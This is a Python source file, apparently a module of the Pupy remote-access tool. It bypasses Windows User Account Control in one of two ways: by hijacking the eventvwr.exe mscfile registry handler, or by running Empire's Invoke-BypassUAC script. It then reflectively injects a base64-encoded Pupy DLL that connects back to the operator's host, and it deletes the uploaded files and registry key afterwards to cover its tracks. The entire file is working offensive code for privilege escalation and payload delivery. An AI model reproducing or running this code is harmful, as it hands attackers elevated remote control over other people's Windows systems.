# -*- coding: UTF8 -*-
#by @bobsesq

import os, logging
import platform
import pupygen
from rpyc.utils.classic import upload
import base64
from tempfile import gettempdir, _get_candidate_names
import subprocess
from modules.lib.windows.powershell_upload import execute_powershell_script
import re, time

class bypassuac():
	'''
	'''
	
	def __init__(self, module, rootPupyPath):
		'''
		'''
		self.module = module
		self.rootPupyPath = rootPupyPath
		#Constants
		self.x86PowershellPath = "syswow64\WindowsPowerShell\\v1.0\\powershell.exe"
		self.x64PowershellPath = "system32\\WindowsPowerShell\\v1.0\\powershell.exe"
		#Remote paths
		self.remoteTempFolder=self.module.client.conn.modules['os.path'].expandvars("%TEMP%")
		self.systemRoot = self.module.client.conn.modules['os.path'].expandvars("%SYSTEMROOT%")
		self.invokeReflectivePEInjectionRemotePath = "{0}.{1}".format(self.module.client.conn.modules['os.path'].join(self.remoteTempFolder, next(_get_candidate_names())), '.txt')
		self.mainPowershellScriptRemotePath = "{0}.{1}".format(self.module.client.conn.modules['os.path'].join(self.remoteTempFolder, next(_get_candidate_names())), '.ps1')
		self.pupyDLLRemotePath = "{0}.{1}".format(self.module.client.conn.modules['os.path'].join(self.remoteTempFolder, next(_get_candidate_names())), '.txt')
		self.invokeBypassUACRemotePath = "{0}.{1}".format(self.module.client.conn.modules['os.path'].join(self.remoteTempFolder, next(_get_candidate_names())), '.ps1')
		#Define Local paths
		self.pupyDLLLocalPath = os.path.join(gettempdir(),'dllFile.txt')
		self.mainPowerShellScriptPrivilegedLocalPath = os.path.join(gettempdir(),'mainPowerShellScriptPrivileged.txt')
		self.invokeReflectivePEInjectionLocalPath = os.path.join(self.rootPupyPath,"pupy", "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1")
		self.invokeBypassUACLocalPath = os.path.join(rootPupyPath, "pupy", "external", "Empire", "privesc", "Invoke-BypassUAC.ps1")
		#Others
		self.HKCU = self.module.client.conn.modules['_winreg'].HKEY_CURRENT_USER
		if "64" in self.module.client.desc['proc_arch']: self.powershellPath = self.module.client.conn.modules['os.path'].join(self.systemRoot, self.x64PowershellPath)
		else: powershellPath = self.module.client.conn.modules['os.path'].join(self.systemRoot, self.x86PowershellPath)
		
	def bypassuac_through_EventVwrBypass(self):
		'''
		Based on Invoke-EventVwrBypass, thanks to enigma0x3 (https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/)
		'''
		#Constants
		mscCmdPath = "Software\Classes\mscfile\shell\open\command"
		eventvwrPath = self.module.client.conn.modules['os.path'].join(self.module.client.conn.modules['os'].environ['WINDIR'],'System32','eventvwr.exe')
		cmd = "{1} -ExecutionPolicy Bypass -File {0}".format(self.mainPowershellScriptRemotePath, self.powershellPath)
		#main
		self.uploadPupyDLL()
		self.uploadPowershellScripts()
		try:
			key = self.module.client.conn.modules['_winreg'].OpenKey(self.HKCU, mscCmdPath, self.module.client.conn.modules['_winreg'].KEY_SET_VALUE)
			logging.debug('The registry key {0} already exist in HKCU, altering...'.format(mscCmdPath))
		except:
			logging.debug("Adding the registry key {0} in HKCU".format(mscCmdPath))
			key = self.module.client.conn.modules['_winreg'].CreateKey(self.HKCU, mscCmdPath)
		registry_key = self.module.client.conn.modules['_winreg'].OpenKey(self.HKCU, mscCmdPath, 0, self.module.client.conn.modules['_winreg'].KEY_WRITE)
		self.module.client.conn.modules['_winreg'].SetValueEx(registry_key, '', 0, self.module.client.conn.modules['_winreg'].REG_SZ, cmd)
		self.module.client.conn.modules['_winreg'].CloseKey(registry_key)
			
		logging.debug('Executing {0} through eventvwr.exe'.format(eventvwrPath))
		output = self.module.client.conn.modules.subprocess.check_output(eventvwrPath, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell = True)
		logging.debug("Output: {0}".format(repr(output)))
		logging.debug("Sleeping 5 secds...")
		time.sleep(5)
		logging.debug("Deleting registry key {0} from HKCU".format(mscCmdPath))
		self.module.client.conn.modules['_winreg'].DeleteKey(self.HKCU, mscCmdPath)
		#Clean
		self.deleteTHisRemoteFile(self.invokeReflectivePEInjectionRemotePath)
		self.deleteTHisRemoteFile(self.mainPowershellScriptRemotePath)
		self.deleteTHisRemoteFile(self.pupyDLLRemotePath)
		self.module.success("Waiting for a connection from the DLL (take few seconds)...")
		
	def bypassuac_through_PowerSploitBypassUAC(self):
		'''
		Performs a bypass UAC attack by utilizing the powersloit UACBypass script (wind7 to 8.1)
		'''
		#Constants
		bypassUACcmd = "Invoke-BypassUAC -Command 'powershell.exe -ExecutionPolicy Bypass -file {0} -Verbose'".format(self.mainPowershellScriptRemotePath) #{0}=mainPowerShellScriptPrivileged.ps1
		byPassUACSuccessString = "DLL injection complete!"
		self.uploadPowershellScripts()
		self.uploadPupyDLL()
		content = re.sub("Write-Verbose ","Write-Output ", open(self.invokeBypassUACLocalPath, 'r').read(), flags=re.I)
		logging.info("Starting BypassUAC script with the following cmd: {0}".format(bypassUACcmd))
		output = execute_powershell_script(self.module, content, bypassUACcmd)
		logging.info("BypassUAC script output: %s\n"%(output))
		if byPassUACSuccessString in output:
			self.module.success("UAC bypassed")
		else:
			self.module.warning("Impossible to know what's happened remotely. You should active debug mode.")
		#Clean
		self.deleteTHisRemoteFile(self.invokeReflectivePEInjectionRemotePath)
		self.deleteTHisRemoteFile(self.mainPowershellScriptRemotePath)
		self.deleteTHisRemoteFile(self.invokeBypassUACRemotePath)
		self.deleteTHisRemoteFile(self.pupyDLLRemotePath)
		#...
		self.module.success("Waiting for a connection from the DLL (take few seconds)...")
		
	def uploadPowershellScripts(self):
		'''
		Upload main powershell script and invokeReflectivePEInjection script
		'''
		mainPowerShellScriptPrivileged = """
		cat {0} | Out-String  | iex
		cat {1} | Out-String  | iex
		Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR
		""" #{0}=Invoke-ReflectivePEInjection.txt and {1}=dllFile.txt
		logging.info("Creating the Powershell script in %s locally"%(self.mainPowerShellScriptPrivilegedLocalPath))
		with open(self.mainPowerShellScriptPrivilegedLocalPath, 'w+') as w:
			w.write(mainPowerShellScriptPrivileged.format(self.invokeReflectivePEInjectionRemotePath, self.pupyDLLRemotePath))
		logging.info("Uploading powershell code for DLL injection in {0}".format(self.invokeReflectivePEInjectionRemotePath))
		upload(self.module.client.conn, self.invokeReflectivePEInjectionLocalPath, self.invokeReflectivePEInjectionRemotePath)
		logging.info("Uploading main powershell script executed by BypassUAC in {0}".format(self.mainPowershellScriptRemotePath))
		upload(self.module.client.conn, self.mainPowerShellScriptPrivilegedLocalPath, self.mainPowershellScriptRemotePath)

	def uploadPupyDLL(self):
		'''
		Returns True if no error. Otherwise returns False
		'''
		res=self.module.client.conn.modules['pupy'].get_connect_back_host()
		host, port = res.rsplit(':',1)
		logging.info("Address configured is %s:%s for pupy dll..."%(host,port))
		logging.info("Looking for process architecture...")
		if self.module.client.conn.modules['pupwinutils.processes'].is_x64_architecture() == True:
			logging.info("Target achitecture is x64, using a x64 dll")
			dllbuff=pupygen.get_edit_pupyx64_dll(self.module.client.get_conf())
		elif self.module.client.conn.modules['pupwinutils.processes'].is_x86_architecture() == True:
			logging.info("Target achitecture is x86, using a x86 dll")
			dllbuff=pupygen.get_edit_pupyx86_dll(self.module.client.get_conf())
		else:
			self.module.error("Target architecture is unknown (!= x86 or x64), abording...")
			return False
		logging.info("Creating the pupy dll in %s locally"%(self.pupyDLLLocalPath))
		with open(self.pupyDLLLocalPath, 'w+') as w:
			w.write('$PEBytes = [System.Convert]::FromBase64String("%s")'%(base64.b64encode(dllbuff)))
		logging.info("Uploading pupy dll in {0}".format(self.pupyDLLRemotePath))
		upload(self.module.client.conn, self.pupyDLLLocalPath, self.pupyDLLRemotePath)
		return True
		
	def deleteTHisRemoteFile(self, remotePath):
		'''
		'''
		logging.debug("Deleting the remote file {0}".format(remotePath))
		try:
			self.module.client.conn.modules['os'].remove(remotePath)
		except Exception, e:
			logging.warning('Impossible to delete remote file {0}: {1}'.format(remotePath, repr(e)))
